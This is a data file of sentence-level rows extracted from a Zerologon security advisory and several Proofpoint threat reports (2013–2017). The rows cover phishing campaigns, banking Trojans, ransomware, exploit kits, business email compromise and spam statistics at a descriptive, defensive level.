CAND_01445,R029,15,R029_P0005,R029_S000259,Detection Methods • The patch level of all Microsoft Windows installations should be reviewed for the presence of relevant security updates as outlined in the Microsoft BITS security advisory.
CAND_01446,R029,16,R029_P0003,R029_S000264,"Table 15: CVE-2020-1472 Vulnerability Details Netlogon Elevation of Privilege (CVE-2020-1472) Vulnerability Description The Microsoft Windows Netlogon Remote Protocol (MS-NRPC) reuses a known, static, zero-value initialization vector (VI) in AES-CFB8 mode, which could allow an unauthenticated attacker to impersonate a domain-joined computer including a domain controller, and potentially obtain domain administrator privileges."
CAND_01447,R029,16,R029_P0004,R029_S000267,"In compromises exploiting this vulnerability, exploitation was typically followed immediately by dumping all hashes for Domain accounts."
CAND_01448,R029,16,R029_P0006,R029_S000269,A nation-state APT group has been observed exploiting this vulnerability.[18] Fix Patch Available Recommended Mitigations • Apply the security updates as recommended in the Microsoft Netlogon security advisory.
CAND_01449,R029,17,R029_P0002,R029_S000277,"Government Targets • ACSC Advisory 2020-016: ""Zerologon"" – Netlogon Elevation of Privilege Vulnerability (CVE-2020- 1472) • NCSC Alert: UK Organisations Should Patch Netlogon Vulnerability (Zerologon) For additional general best practices for mitigating cyber threats, see the joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity and ACSC’s Essential Eight mitigation strategies."
CAND_01450,R029,18,R029_P0002,R029_S000290,REFERENCES [1] NSA-CISA-FBI Cybersecurity Advisory: Russian SVR Targets U.S.
CAND_01451,R030,1,R030_P0002,R030_S000001,threat protection | compliance | archiving & governance | secure communication THREAT REPORT 6
CAND_01452,R030,1,R030_P0003,R030_S000004,Malvertising is a particularly stealthy attack.
CAND_01453,R030,1,R030_P0003,R030_S000005,Bona fide and trusted sites serve up what are thought to be standard ads.
CAND_01454,R030,1,R030_P0003,R030_S000006,"In reality, the ads carry malware and the end user is oblivious."
CAND_01455,R030,1,R030_P0003,R030_S000008,"Malvertising is particularly hard to detect as most ads are regularly rotated through a site or a specific page and users pay fleeting attention to them, resulting in little or no forensic evidence."
CAND_01456,R030,1,R030_P0003,R030_S000009,Malvertising is also very pervasive; in 2012 the OTA estimates nearly 10 Billion ad impressions were compromised.
CAND_01457,R030,2,R030_P0001,R030_S000012,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01458,R030,2,R030_P0001,R030_S000013,"THREAT REPORT [2] Recently, Proofpoint researchers uncovered a malvertising attack being served by the New York Times."
CAND_01459,R030,2,R030_P0001,R030_S000018,Longlining was defined in the January Threat Report and also detailed in the Proofpoint white paper titled - Longline Phishing.
CAND_01460,R030,2,R030_P0001,R030_S000019,"Longline phishing attacks are defined by three specific characteristics: 1) Proportionally low volume per organization, with high volume overall 2) Aggressive obfuscation and customization techniques and 3) Malware payloads which utilize unpatched exploits."
CAND_01461,R030,2,R030_P0001,R030_S000020,"This was a highly effective campaign, recording a click rate of 24%."
CAND_01462,R030,2,R030_P0001,R030_S000021,The details of the campaign are also interesting.
CAND_01463,R030,2,R030_P0001,R030_S000022,The email lures were realistic and quite sophisticated with no noticeable errors.
CAND_01464,R030,2,R030_P0002,R030_S000025,At first read it’s as sophisticated as the AMEX lure.
CAND_01465,R030,2,R030_P0002,R030_S000027,"They were sent using 3,040 different sender"
CAND_01466,R030,3,R030_P0001,R030_S000028,"©2013 Proofpoint, Inc."
CAND_01467,R030,3,R030_P0002,R030_S000034,"As stated earlier, this campaign garnered an impressive 24% click rate; a high rate and therefore successful campaign."
CAND_01468,R030,3,R030_P0002,R030_S000037,It’s vital to consider usage patterns and to protect users both on and off the corporate network.
CAND_01469,R030,3,R030_P0002,R030_S000038,Proofpoint Targeted Attack Protection delivers this level of protection.
CAND_01470,R030,3,R030_P0002,R030_S000042,The headers of the image files were modified to enable remote execution of “a function that will execute any content delivered to it via POST.
CAND_01471,R030,3,R030_P0002,R030_S000045,"Similar to a watering hole in nature, the hunter knows the prey must come to drink at some point, and so they lie in wait."
CAND_01472,R030,3,R030_P0002,R030_S000047,In the case cited in this article; http://www.infosecurity-magazine.com/view/28450/the-voho-campaign-gh0st-rat-spread-by- waterholing RSA researchers exposed a waterhole attack that infected 12% of the visiting population to such a site.
CAND_01473,R030,4,R030_P0001,R030_S000048,"©2013 Proofpoint, Inc."
CAND_01474,R030,4,R030_P0001,R030_S000049,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01475,R030,4,R030_P0001,R030_S000052,It is hard to grasp the volume of the data breach problem.
CAND_01476,R030,4,R030_P0001,R030_S000053,"The team at “Information is Beautiful” has published one of the most informative and interactive infographic covering data breaches, providing multiple filters."
CAND_01477,R030,4,R030_P0001,R030_S000054,Details of each breach can be located with a simple click on each bubble.
CAND_01478,R030,4,R030_P0001,R030_S000055,http://www.informationisbeautiful.net/visualizations/worlds-biggest-data-breaches-hacks/ Threat Trends Spam Volume Trends Proofpoint tracks spam volumes via a system of honeypots.
CAND_01479,R030,4,R030_P0001,R030_S000056,These spam volumes have historically tracked closely with that of our customer base.
CAND_01480,R030,4,R030_P0001,R030_S000057,Spam increased again in July.
CAND_01481,R030,4,R030_P0001,R030_S000058,"Unlike June where spam volumes presented an erratic pattern all month, July volumes remained in a narrower range."
CAND_01482,R030,4,R030_P0001,R030_S000060,Each occurrence can be seen in the graph below.
CAND_01483,R030,4,R030_P0002,R030_S000061,July set a new yearly high for the third month running.
CAND_01484,R030,4,R030_P0002,R030_S000062,June to July volumes increased by 3.74% - the sixth monthly increase in a row.
CAND_01485,R030,4,R030_P0002,R030_S000063,"July recorded a 60.51% year over year increase from July of last year, the largest year over year increase in over two years."
CAND_01486,R030,4,R030_P0003,R030_S000066,0 2 4 6 8 10 12 7/1 7/8 7/15 7/22 7/29 Millions Monthly Message Volume - July 2013
CAND_01487,R030,5,R030_P0001,R030_S000067,"©2013 Proofpoint, Inc."
CAND_01488,R030,5,R030_P0001,R030_S000068,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01489,R030,5,R030_P0002,R030_S000070,Phish Classification Trends
CAND_01490,R030,5,R030_P0003,R030_S000071,The average percent of daily messages classified as phish by Proofpoint’s MLX technology continued a downward trend in July.
CAND_01491,R030,5,R030_P0003,R030_S000074,"On average in July, 10.11% of daily message volumes were classified as phish; a 2.5% decrease in standard phish messages from June."
CAND_01492,R030,5,R030_P0004,R030_S000075,0 2 4 6 8 10 12 14 Jul-12 Aug-12 Sep-12 Oct-12 Nov-12Dec-12 Jan-13 Feb-13Mar-13 Apr-13May-13 Jun-13 Jul-13 Millions Yearly Message Volume - July 2012 to July 2013 0 2 4 6 8 10 12 14 16 18 1-Jul 3-Jul 5-Jul 7-Jul 9-Jul 11-Jul 13-Jul 15-Jul 17-Jul 19-Jul 21-Jul 23-Jul 25-Jul 27-Jul 29-Jul 31-Jul Percentage of Phish - July 2013
CAND_01493,R030,6,R030_P0001,R030_S000076,"©2013 Proofpoint, Inc."
CAND_01494,R030,6,R030_P0001,R030_S000078,THREAT REPORT [6] Spam Sources by Country The European Union again ranks as the number one spam source in July 2013.
CAND_01495,R030,6,R030_P0001,R030_S000080,This marks four straight months where the first and second spots remained unchanged.
CAND_01496,R030,6,R030_P0002,R030_S000083,1 2 3 4 5 6 7 8 Korea Russia India Brazil EU Vietnam UK Taiwan USA Belarus China Spain Saudi Arabia Turkey Colombia Peru Mexico Argentina
CAND_01497,R030,7,R030_P0002,R030_S000085,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01498,R030,7,R030_P0002,R030_S000086,"[7] In the table below are the leading spam senders for the months of June and July, ranked by % of the total spam volume."
CAND_01499,R030,7,R030_P0002,R030_S000087,June 2013 July 2013 1 EU 15.88% 1 EU 17.76% 2 USA 5.71% 2 USA 7.05% 3 India 5.38% 3 Argentina 5.19% 4 Taiwan 5.01% 4 India 4.31% 5 Argentina 4.58% 5 Taiwan 3.80% 6 China 3.53% 6 Mexico 3.37% 7 Mexico 3.29% 7 China 3.14% 8 Columbia 2.75% 8 Korea 3.02%
CAND_01500,R030,7,R030_P0003,R030_S000089,"892 Ross Drive, Sunnyvale, CA 94089 Tel: +1 408 517 4710 www.proofpoint.com"
CAND_01501,R031,1,R031_P0001,R031_S000001,"©2015 Proofpoint, Inc."
CAND_01502,R031,1,R031_P0001,R031_S000002,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01503,R031,1,R031_P0001,R031_S000003,[1] THREAT REPORT \
CAND_01504,R031,1,R031_P0002,R031_S000007,The optimization of growth and profitability is of paramount importance to them.
CAND_01505,R031,1,R031_P0002,R031_S000009,"Quite simply, when a user “enables content” for a particular developer’s macro, a VBScript, a batch file, and one or two other files are created, depending on which version of Windows the client is running."
CAND_01506,R031,1,R031_P0002,R031_S000010,"These files execute in series and download a malware payload, as well as downloading a “statistics image”."
CAND_01507,R031,2,R031_P0001,R031_S000017,"More recently, Proofpoint researchers observed a marked change in the statistics feature, namely, the macro loads two images, one when the payload is downloaded, and a second, different image once it can verify that the infection process is complete."
CAND_01508,R031,2,R031_P0001,R031_S000021,"This is critical threat intelligence for security professionals, as well as important business intelligence for threat actors, who evaluate the success of their campaigns."
CAND_01509,R031,2,R031_P0001,R031_S000023,Lessons Learned From the Ramnit Botnet Takedown The successful takedown of a well-known botnet can be attributed to big data.
CAND_01510,R031,2,R031_P0001,R031_S000024,"In February of this year, Europol, together with Microsoft, Symantec, and AnubisNetworks, led the takedown operation of the Ramnit botnet."
CAND_01511,R031,2,R031_P0001,R031_S000025,"“It is not a matter of if you will be breached, but when” has become an adage, the truth of which is recognized by the security community as a whole."
CAND_01512,R031,2,R031_P0001,R031_S000026,It is no longer enough to prevent a breach.
CAND_01513,R031,2,R031_P0001,R031_S000028,"The harsh reality is that in most cases, organizations are oblivious of what is happening, namely, that a data breach was suffered or that they are being assaulted by hackers."
CAND_01514,R031,2,R031_P0001,R031_S000030,Read the particulars and pay heed to a few key takeaways: http://www.darkreading.com/endpoint/lessons-learned-from-the-ramnit- botnet-takedown/a/d-id/1320861.
CAND_01515,R031,3,R031_P0001,R031_S000033,"[3] THREAT REPORT Threat News Japan Pension Service Hack Used Classic Attack Method Japan’s pension system has been hacked and more than a million cases of personal data (combinations of names, identification numbers, birth dates and addresses) have been leaked as staff computers were improperly accessed by an external email virus."
CAND_01516,R031,3,R031_P0001,R031_S000034,The hackers are believed to have used the classic “targeted email attack” maneuver.
CAND_01517,R031,3,R031_P0001,R031_S000035,Japan Pension Service (JPS) reported the attacks to the Metropolitan Police Department on May 19th.
CAND_01518,R031,3,R031_P0001,R031_S000037,"Interestingly, the Trojan has been linked to previous compromises of critical infrastructure since the end of 2014."
CAND_01519,R031,3,R031_P0001,R031_S000039,Click here for more information: http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid= 27975.
CAND_01520,R031,3,R031_P0001,R031_S000040,The police investigation is ongoing.
CAND_01521,R031,3,R031_P0001,R031_S000042,The attachment masqueraded as a Ministry of Health document.
CAND_01522,R031,3,R031_P0001,R031_S000044," Another 1.17 million involved the leak of pension IDs, names and birth dates."
CAND_01523,R031,3,R031_P0001,R031_S000045," In the remaining 31,000 cases, only pension IDs and names were stolen."
CAND_01524,R031,4,R031_P0001,R031_S000050,"[4] THREAT REPORT According to a report from TrapX, serious breaches of hospital networks are assuredly more common than not, “as compromised medical devices often hide the telltale signs of malware infection and data theft.” The TrapX report claims that perpetrators are using unprotected medical devices, including radiological systems, to secure and maintain a firm position on healthcare networks and therefore avoiding detection by security software and IT staff."
CAND_01525,R031,4,R031_P0001,R031_S000051,The report combines details from TrapX customer engagements with healthcare firms and company-sponsored analysis of common medical devices.
CAND_01526,R031,4,R031_P0001,R031_S000053,Read the full report: https://securityledger.com/wp- content/uploads/2015/06/AOA_MEDJACK_LAYOUT_6-0_6-3-2015-1.pdf.
CAND_01527,R031,4,R031_P0001,R031_S000056,government has mandated the use of the HTTPS (HyperText Transport Protocol Secure) protocol across all publicly accessible federal websites and Web services by the end of next year.
CAND_01528,R031,4,R031_P0001,R031_S000058,"Simply stated, deploying HTTPS will encrypt user authentication sessions in government websites."
CAND_01529,R031,5,R031_P0001,R031_S000060,"©2015 Proofpoint, Inc."
CAND_01530,R031,5,R031_P0001,R031_S000061,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01531,R031,5,R031_P0001,R031_S000062,[5] THREAT REPORT Read the government missive: https://https.cio.gov/.
CAND_01532,R031,5,R031_P0001,R031_S000063,"At present, a mere 28% of federal agencies run encrypted."
CAND_01533,R031,5,R031_P0001,R031_S000064,"The HTTPS websites include whitehouse.gov, cia.gov, nsa.gov, and omb.gov."
CAND_01534,R031,5,R031_P0001,R031_S000068,It does not guarantee the integrity of the systems themselves.
CAND_01535,R031,5,R031_P0001,R031_S000073,"The infographic specifically discloses selected losses of more than 30,000 records."
CAND_01536,R031,6,R031_P0001,R031_S000078,June’s daily spam volume was turbulent.
CAND_01537,R031,6,R031_P0001,R031_S000079,It began above 2 million for a good part of the first week and then skyrocketed to well over 7 million.
CAND_01538,R031,6,R031_P0001,R031_S000081,An instantaneous leap to above 4 million followed in addition to another dramatic decline to below 2 million.
CAND_01539,R031,6,R031_P0001,R031_S000082,Ever-so-slight fluctuations just below 2 million led to the next striking rise to over 7 million at the start of the third week.
CAND_01540,R031,6,R031_P0001,R031_S000083,That rise brought yet another fall.
CAND_01541,R031,7,R031_P0001,R031_S000089,"©2015 Proofpoint, Inc."
CAND_01542,R031,7,R031_P0001,R031_S000090,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01543,R031,7,R031_P0001,R031_S000094,The following table shows the top five spam-sending regions and countries for the last six months.
CAND_01544,R031,7,R031_P0002,R031_S000095,Jan ’15 Feb ’15 Mar ’15 Apr ’15 May ’15 Jun ’15 Rank 1st EU EU EU EU EU EU 2nd US US US US US US 3rd Vietnam Vietnam Russia China China China 4th Argentina Argentina India India Russia Russia 5th China Russia China – Indonesia Argentina
CAND_01545,R031,7,R031_P0003,R031_S000097,"The calculation for the EU is based on the inclusion of all member states, thereby producing a better representation of its volume."
CAND_01546,R031,7,R031_P0003,R031_S000098,"At 29.15%, the EU generated the majority of the world’s spam."
CAND_01547,R031,7,R031_P0003,R031_S000099,The remaining four countries in the top five slots were collectively responsible for 21.83%—well below the output of the EU.
CAND_01548,R031,7,R031_P0004,R031_S000100,"The following table displays the top five spam-sending member states of the European Union (EU) for May 2015 and June 2015, in addition to the percentage of total spam volume for each country."
CAND_01549,R031,7,R031_P0006,R031_S000102,"For additional insights visit us at www.proofpoint.com/threatinsight Proofpoint, Inc."
CAND_01550,R031,7,R031_P0006,R031_S000103,"892 Ross Drive, Sunnyvale, CA 94089 Tel: +1 408 517 4710 www.proofpoint.com"
CAND_01551,R032,1,R032_P0001,R032_S000001,"The Proofpoint Threat Report explores threats, trends, and transformations that we see within our customer base and in the wider security marketplace."
CAND_01552,R032,2,R032_P0001,R032_S000006,"• The September pause in Dridex activity demonstrated the speed with which threat actors can adapt and change payloads, and delivery methods."
CAND_01553,R032,2,R032_P0001,R032_S000012,"• Data breaches dominated the headlines in the information security world in Q3, with multiple high-profile breaches exposing not only highly sensitive personal information for up to 35 million individuals, but also details of several previously undisclosed zero-day exploits that quickly made their way into exploit kits and other threat actor tools."
CAND_01554,R032,2,R032_P0001,R032_S000013,"Organizations need to take action to defend themselves against this wide range of threats; immediate actions include: • Adopt advanced threat solutions to identify and block targeted attacks that travel over email, the #1 threat vector."
CAND_01555,R032,3,R032_P0001,R032_S000021,(Fig.
CAND_01556,R032,3,R032_P0001,R032_S000023,"As summarized in our mid-year Threat Report, these campaigns employed malicious macros of increasing sophistication embedded in a variety of document formats."
CAND_01557,R032,3,R032_P0001,R032_S000024,The documents themselves leveraged social engineering techniques in order to entice the recipient to click the “Enable Content” button that would allow the malicious macro to run and install the malware payload(s).
CAND_01558,R032,3,R032_P0001,R032_S000025,(Fig.
CAND_01559,R032,3,R032_P0001,R032_S000026,"2) 0 1 1 2 2 3 3 4 4 5 5 1/1/2015 2/1/2015 3/1/2015 4/1/2015 5/1/2015 6/1/2015 7/1/2015 8/1/2015 9/1/2015 10/1/2015 URLs Document attachments Indexed Trend of Malicious URLs vs Document Attachments January-September 2015 Figure 1: Indexed trend of malicious URLs vs document attachments, January-September 2015 Figure 2: Example of attached document with malicious macro."
CAND_01560,R032,3,R032_P0001,R032_S000027,User is instructed to click “Enable Macros” to reveal the (fake) blurred content
CAND_01561,R032,4,R032_P0001,R032_S000031,"3) While the Dridex campaigns mostly targeted organizations in the US and UK during the first half of 2015, by mid-year they started to target other countries in the EU."
CAND_01562,R032,4,R032_P0001,R032_S000032,"For the entire month of July, France in particular was targeted by Dridex campaigns, as noted by Proofpoint researchers: • Dridex actor shifts focus to Europe, including first wave of French campaigns: http://www.proofpoint.com/us/ threat-insight/post/not-so-innocents-abroad-dridex-actor-shifts-focus-to-europe • Analysis of sustained Dridex campaigns targeting France: http://www.proofpoint.com/us/threat-insight/post/ Fleurs-du-malware As the data show, in August the volume of Dridex messages continued and actually increased, but attackers again distributed their focus more broadly."
CAND_01563,R032,4,R032_P0001,R032_S000033,"Dridex arrests disrupt campaigns, prompt change in payloads August was followed by another noteworthy event of the third quarter: the reported arrests of several individuals in the Dridex malware group around September 1."
CAND_01564,R032,4,R032_P0001,R032_S000035,But what happened to malware payloads during the Dridex hiatus?
CAND_01565,R032,4,R032_P0001,R032_S000040,"4) 0 500000 1000000 1500000 2000000 2500000 3000000 3500000 4000000 4/1/2015 5/1/2015 6/1/2015 7/1/2015 8/1/2015 9/1/2015 Dridex Dyre/Dyreza Upatre CryptoWall Vawtrak 8 7 6 5 4 3 2 1 Figure 3: Indexed weekly phishing document attachment malware volume, by payload, April-September 2015 0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100% 4/1/2015 5/1/2015 6/1/2015 7/1/2015 8/1/2015 9/1/2015 Vawtrak CryptoWall Upatre Dyre/Dyreza Dridex Figure 4: Weekly phishing document attachment malware payload as a percentage of total malware, April-September 2015"
CAND_01566,R032,5,R032_P0001,R032_S000042,"Moreover, Dyre has been steadily present and exhibited brief surges over the past ten months, but CryptoWall and Vawtrak had both been largely absent from malicious document attachment phishing payloads in significant numbers for at least six months, so in raw terms these two were the most direct beneficiaries of the Dridex hiatus."
CAND_01567,R032,5,R032_P0001,R032_S000046,• “Old” threats are never far away: just because a particular malware payload has not been detected in months does not mean that it is no longer a threat.
CAND_01568,R032,5,R032_P0001,R032_S000048,"APT actors leverage phishing to infect targets In addition to detecting and analyzing numerous broad-based campaigns this quarter, Proofpoint researchers carried out original analyses of highly targeted attacks."
CAND_01569,R032,5,R032_P0001,R032_S000051,Read more: https://www.proofpoint.com/us/threat-insight/post/ Operation-Arid-Viper-Slithers-Back-Into-View Both attacks bear the characteristics of sophisticated state-sponsored actors and target individuals and organizations in narrowly-defined regions and verticals; both also demonstrate that email remains the “go-to” vector for these attacks.
CAND_01570,R032,6,R032_P0001,R032_S000056,"Threat Report | July - September 2015 6 High volume of “Business Email Compromise” (BEC) messages The period of July-September also witnessed the continued increase in phishing activity known as “Business Email Compromise” (BEC), also referred to as “wire transfer fraud,” which reached a level sufficient to provoke a warning from the FBI about this threat."
CAND_01571,R032,6,R032_P0001,R032_S000058,(Fig.
CAND_01572,R032,6,R032_P0001,R032_S000061,"The message typically requests that the recipient immediately make a wire transfer to a third party, often with instructions to keep the request and transfer confidential."
CAND_01573,R032,6,R032_P0001,R032_S000065,"These attacks embrace a “blockbuster” approach on the part of the attackers, in that while many of these messages will be quickly recognized by recipients as phishing, the small fraction that succeed can yield millions of dollars in fraudulent transfers."
CAND_01574,R032,6,R032_P0001,R032_S000069,"• Tag the Subject line of all inbound email from the Internet with “EXTERNAL”, and reject all mail coming from an unresolvable domain in the envelope Sender field."
CAND_01575,R032,6,R032_P0001,R032_S000070,"• Ensure that internal Finance and Purchasing controls are in place to authenticate legitimate requests, including addition of a secondary approval by another individual in the organization."
CAND_01576,R032,6,R032_P0001,R032_S000073,"As organizations learn to recognize and block – through a combination of technical and procedural means – BEC phishing messages, their impact will decrease."
CAND_01577,R032,6,R032_P0001,R032_S000074,"However, as Proofpoint research has shown, cybercriminals are capable of rapidly adapting to improved defenses and deploying new techniques and malware."
CAND_01578,R032,7,R032_P0001,R032_S000076,Threat Report | July - September 2015 7 Exploit Kits Exploit kit (EK) activity tracked by Proofpoint researchers in Q3 showed that Angler accounted for the majority of EK traffic over the quarter.
CAND_01579,R032,8,R032_P0001,R032_S000084,Read more: https://securelist.com/blog/research/72097/attacking-diffie-hellman-protocol-implementation-in-the- angler-exploit-kit/.
CAND_01580,R032,8,R032_P0001,R032_S000085,• Exploit kits filtered client traffic with expanded techniques for detecting antivirus and researcher tools such as local proxies.
CAND_01581,R032,8,R032_P0001,R032_S000087,"• New “exploit kit” dubbed Spartan by Dell SecureWorks, which resembles a Nuclear Pack “detachable” flash."
CAND_01582,R032,8,R032_P0001,R032_S000088,• Attackers leveraged the Adobe® Type Manager® exploit (CVE-2015-2426) inside exploit kits to allow privilege escalation.
CAND_01583,R032,8,R032_P0001,R032_S000089,"Relatively new exploit kits continued to enter the fray in Q3, with Hunter EK emerging and Sundown (analyzed by Proofpoint in June, Fig."
CAND_01584,R032,8,R032_P0001,R032_S000090,8) adding features and exploits before other exploit kits.
CAND_01585,R032,8,R032_P0001,R032_S000091,Related reading: http://www.symantec.com/connect/blogs/sundown-exploit- kit-adds-internet-explorer-exploit-any-other-kit http://www.proofpoint.com/us/threat-insight/post/Light- After-Dark Figure 8: Xer (aka Sundown) exploit kit cpanel login page
CAND_01586,R032,9,R032_P0001,R032_S000101,"The attacker’s tweet includes a link to a bogus website, which also mimic’s MajorBank’s legitimate site, asking the customer to login to resolve their issue (e.g."
CAND_01587,R032,9,R032_P0001,R032_S000102,download a fix).
CAND_01588,R032,9,R032_P0001,R032_S000104,"We have seen this tactic applied not only to banks, but to retail, technology, and entertainment brands as well."
CAND_01589,R032,9,R032_P0001,R032_S000106,"Not only does the phishing lure described above appear completely legitimate, but it’s a message that the victim is actually expecting and incented to act upon (they want their problem solved)!"
CAND_01590,R032,9,R032_P0001,R032_S000109,"Spam Statistics Figure 9: Daily spam message volume, July-September 2015"
CAND_01591,R032,10,R032_P0001,R032_S000112,The daily message volume for the third quarter of 2015 follows.
CAND_01592,R032,10,R032_P0001,R032_S000118,"11.46% 3 China 6.41% 4 Russia 3.61% 5 Vietnam 2.84% The following table displays the top five spam-sending member states of the European Union (EU) for the third quarter (2015), in addition to the percentage of total spam volume for each country."
CAND_01593,R032,11,R032_P0001,R032_S000125,com and stole private information.
CAND_01594,R032,11,R032_P0001,R032_S000126,Lawsuits involving hundreds of millions of dollars were filed in the wake of users’ private information having been publicly disclosed.
CAND_01595,R032,11,R032_P0001,R032_S000132,Criminals used data stolen from other sources to gain access to taxpayers’ past returns through the IRS “Get Transcript” application.
CAND_01596,R032,11,R032_P0001,R032_S000135,"CISA would protect businesses that share this information with each other, and with government agencies."
CAND_01597,R032,11,R032_P0001,R032_S000136,Read more: http://www.cio.com/article/2980699/cisa-likely-coming-back-to-senate-amid-doubts-about-effectiveness.html
CAND_01598,R032,12,R032_P0001,R032_S000137,"Threat Report | July - September 2015 12 Appendix: Proofpoint Threat Insight research published in Q3 “The Human Factor 2015 Close-up: What are users clicking on?” (July 1, 2015) Threat Insight takes a closer look at the changes in phishing lures and templates that are targeting corporate users."
CAND_01599,R032,12,R032_P0001,R032_S000143,"Threats analyzed: AlienSpy, Remote access Trojans, Obfuscation http://www.proofpoint.com/us/threat-insight/post/You-Dirty-RAT “Hunter Exploit Kit Targets Brazilian Banking Customers” (August 27, 2015) The Hunter exploit kit (EK) is detected and analyzed via its initial target of Brazilian banking customers."
CAND_01600,R032,13,R032_P0001,R032_S000154,"“In Pursuit of Optical Fibers and Troop Intel: Targeted Attack Distributes PlugX in Russia” (September 15, 2015) Look inside a highly targeted campaign that uses specially crafted URLs and social engineering to spread the PlugX Trojan to targets in the Russian military and telco sectors Threats analyzed: PlugX Trojan, APT, Targeted Attacks, Phishing, Malicious URLs http://www.proofpoint.com/us/threat-insight/post/PlugX-in-Russia “Operation Arid Viper Slithers Back into View” (September 18, 2015) Proofpoint researchers’ analysis of an update to Operation Arid Viper demonstrates that this threat still has teeth."
CAND_01601,R033,2,R033_P0001,R033_S000002,"The Proofpoint Quarterly Threat Report highlights the threats, trends, and key takeaways we see within our large customer base and in the wider threat landscape."
CAND_01602,R033,3,R033_P0002,R033_S000012,5 Social Media....................................................................................................................................................................................
CAND_01603,R033,3,R033_P0002,R033_S000021,14
CAND_01604,R033,4,R033_P0001,R033_S000027,"Meanwhile, social engineering and targeting techniques further evolved in email fraud and attacks on social media."
CAND_01605,R033,4,R033_P0001,R033_S000028,"And in our first public report of lookalike domains used for a range of attacks and fraud, attackers appear to be winning the domain-registration race."
CAND_01606,R033,4,R033_P0001,R033_S000038,It accounted for almost 55% of total message volume and more than 86% of all ransomware volume.
CAND_01607,R033,4,R033_P0001,R033_S000039,"At the same time, strains known as Philadelphia and GlobeImposter grew from small, regionally focused variants into global threats, thanks to a few high-volume campaigns by a single attacker."
CAND_01608,R033,4,R033_P0001,R033_S000040,"BANKING TROJANS represented 24% of all malicious email volume, with a strain called The Trick accounting for 70% of that total."
CAND_01609,R033,5,R033_P0001,R033_S000065,Suspicious domain registrations grew 20%.
CAND_01610,R033,5,R033_P0001,R033_S000069,The volume of fraudulent email that delivered malware through malicious URLs grew dramatically.
CAND_01611,R033,5,R033_P0001,R033_S000076,"When executed, the scripts downloaded and installed LOCKY ransomware."
CAND_01612,R033,5,R033_P0001,R033_S000084,DEFENSIVE REGISTRATIONS The recommended practice of buying up internet domains that could be mistaken for yours before attackers do.
CAND_01613,R033,6,R033_P0001,R033_S000088,Figure 3: July 2017 through September 2017 (92 Days) Ransomware vs.
CAND_01614,R033,6,R033_P0001,R033_S000091,Dyre’s operators were arrested in 2015 by Russian authorities but the malware resurged in 2017.
CAND_01615,R033,7,R033_P0001,R033_S000093,"Most of this malware came from TA505, the threat actor behind massive email campaigns using Locky ransomware and the Dridex banking Trojan."
CAND_01616,R033,7,R033_P0001,R033_S000094,DRIDEX traffic fell sharply as TA505 switched over to The Trick.
CAND_01617,R033,7,R033_P0001,R033_S000097,"In a potentially bigger development, banking Trojans such as RETEFE and The Trick paired with the EternalBlue exploit."
CAND_01618,R033,7,R033_P0001,R033_S000100,But these “ripples” of early summer’s WANNACRY outbreak—which also used EternalBlue—hint at a potential trend for 2018.
CAND_01619,R033,7,R033_P0001,R033_S000106,RETEFE This banking Trojan has mostly targeted areas of Europe.
CAND_01620,R033,8,R033_P0001,R033_S000110,"Quarterly Threat Report | Q3 2017 8 RANSOMWARE: DOUBLING DOWN ON LOCKY, WHILE DESTRUCTIVE RANSOMWARE INCREASES Key Stat: Ransomware attempts accounted for almost 64% of total malicious message volume across our global customer base."
CAND_01621,R033,8,R033_P0001,R033_S000112,"New variants emerged daily, development of destructive ransomware persisted, and targeted attacks grew."
CAND_01622,R033,8,R033_P0001,R033_S000116,Other attackers shifted further from indiscriminate high-volume campaigns to more targeted attacks.
CAND_01623,R033,8,R033_P0001,R033_S000117,One introduced the Defray ransomware strain in small-scale attacks on healthcare and education targets in August.
CAND_01624,R033,8,R033_P0001,R033_S000118,Other attackers followed suit.
CAND_01625,R033,8,R033_P0001,R033_S000124,"As Figure 6 shows, high-volume attackers consolidated around a smaller number of ransomware strains in Q3, despite new strains and uses."
CAND_01626,R033,8,R033_P0001,R033_S000127,AFFILIATE IDS Malware authors often pay affiliates to spread their malware.
CAND_01627,R033,9,R033_P0001,R033_S000130,Quarterly Threat Report | Q3 2017 9
CAND_01628,R033,9,R033_P0003,R033_S000132,The nearly exponential growth of new RANSOMWARE strains over the last year appears to finally be slowing slightly—but not because of any reduced threat.
CAND_01629,R033,9,R033_P0003,R033_S000135,"The decrease is likely due to a drop in large numbers of “minor project,” proof-of- concept, experimental, and “script kiddie” ransomware strains that helped inflate earlier totals."
CAND_01630,R033,10,R033_P0001,R033_S000139,Quarterly Threat Report | Q3 2017 10 EMAIL FRAUD GROWS WHILE ACTORS REFINE TECHNIQUES Key stat: Attempted email fraud attacks grew 29% from the previous quarter across our global customer base.
CAND_01631,R033,10,R033_P0002,R033_S000152,CRYPTOCURRENCY A form of digital money designed to be secure and anonymous.
CAND_01632,R033,10,R033_P0002,R033_S000157,"The most popular mainstream cryptocurrency, Bitcoin, now requires near-supercomputer computational power to mine."
CAND_01633,R033,10,R033_P0002,R033_S000161,The Pirate Bay recently made headlines by using visitors’ CPU cycles to mine Monero currency.
CAND_01634,R033,10,R033_P0002,R033_S000162,The threat is multi-pronged.
CAND_01635,R033,10,R033_P0002,R033_S000167,"Until the smaller currencies reach the saturation levels of Bitcoin, the prospects are highly lucrative."
CAND_01636,R033,11,R033_P0001,R033_S000177,(This type of attacks is represented in Figure 9 as a “one-to-one” attack.) But cyber criminals are expanding their reach and targeting more people within each organization.
CAND_01637,R033,11,R033_P0001,R033_S000196,"EMAIL FRAUD In email fraud attacks, an email purporting to come from a top executive asks the recipient to wire money or send sensitive information."
CAND_01638,R033,12,R033_P0001,R033_S000198,"Quarterly Threat Report | Q3 2017 12 Figure 10: Top exploit kit traffic as percentage of total, April-May 2017 Exploit Kit Activity—Share of Samples Collected Q3 2017 0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100% RIG Neutrino Angler Magnitude Nuclear Sundown July August September DOMAIN TRENDS Key stat: Suspicious domain registrations outnumbered defensive registrations 20 to 1, widening the gap between companies looking to protect their brand and attackers looking to exploit it."
CAND_01639,R033,12,R033_P0001,R033_S000199,In Q3 we extended our research to examine the registration of “suspicious domains” for the Fortune 50.
